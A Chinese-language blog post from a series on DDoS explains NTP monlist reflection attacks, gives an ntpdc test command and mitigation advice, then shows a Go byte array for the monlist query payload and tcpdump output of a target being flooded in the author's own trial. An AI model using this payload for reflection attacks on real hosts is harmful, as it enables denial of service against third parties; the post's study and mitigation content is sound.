---
author: Sunny Tsai
title: "[Day 18] 閑著沒事 - NTP 反射攻擊"
date: 2023-10-01
math: true
tags: [
    "cloud",
    "ntp reflect",
]
categories: [
    "2023鐵人賽"
]
series: ["2023鐵人賽-DDOS：閑的沒事就開始DDOS"]
---
# NTP
NTP（Network Time Protocol）網路時間協議，用來同步主機時間的網路協議。

# NTP Monlist
NTP有一個monitor功能，也被稱為MON_GETLIST。這個功能為監控伺服器。NTP服務器收到monlist後就會返回與NTP服務器同步過的最後600個客戶端IP。
可以在客戶端主機輸入以下command line測試：
```
ntpdc -n -c monlist x.x.x.x | wc -l
```
輸出為收到的數據行數

# 如何避免
禁用monlist:
將ntp server升級到4.2.7p26或更高版本，在4.2.7前的版本，在配置檔設定```disable monitor```禁用monlist功能。

# code
ntp跟dns查詢一樣是發送udp封包，把payload修改一下就可以了
```
ntpdcMonlistQuery := []byte{
	0x17, 0x00, 0x03, 0x2a, // NTPDC Request Header
	// Monlist Query
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Cookie
}
```

# 目標主機攔截封包
```
> sudo tcpdump -i eth0 host 10.211.55.10 and port 123 -v
03:02:08.524364 IP (tos 0x10, ttl 64, id 43750, offset 0, flags [DF], proto UDP (17), length 76)
    ubuntu-linux-20-04-desktop.38707 > prod-ntp-5.ntp1.ps5.canonical.com.ntp: NTPv4, length 48
	Client, Leap indicator:  (0), Stratum 0 (unspecified), poll 0 (1s), precision 0
	Root Delay: 0.000000, Root dispersion: 0.000000, Reference-ID: (unspec)
	  Reference Timestamp:  0.000000000
	  Originator Timestamp: 0.000000000
	  Receive Timestamp:    0.000000000
	  Transmit Timestamp:   3905175728.121997727 (2023/10/02 03:02:08)
	    Originator - Receive Timestamp:  0.000000000
	    Originator - Transmit Timestamp: 3905175728.121997727 (2023/10/02 03:02:08)
        ...
```

試了一下，目標主機收到大量時間校正封包...
